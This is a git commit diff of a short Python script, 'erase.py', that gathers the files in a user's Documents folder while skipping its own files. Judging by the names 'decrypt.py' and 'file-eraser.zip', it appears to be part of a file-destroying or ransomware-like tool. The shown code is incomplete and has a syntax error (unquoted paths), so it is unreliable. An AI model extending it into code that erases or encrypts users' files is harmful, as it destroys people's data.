04b111cfb7adcd323d80b5e1a570e9bfe5666b1b
unfavorablesemi <105513420+unfavorablesemi@users.noreply.github.com>
2022-05-18 15:08:23 -0400

    Update erase.py

--- erase.py
+++ erase.py
@@ -1,7 +1,7 @@
 import os
 files = []
-for file in os.listdir(/home/user/Downloads):
-        if file == "voldimrt.py" or file == "decrypt.py":
+for file in os.listdir(/home/user/Documents):
+        if file == "erase.py" or file == "file-eraser.zip":
                 continue
         if os.path.isfile(file):
                 files.append(file)
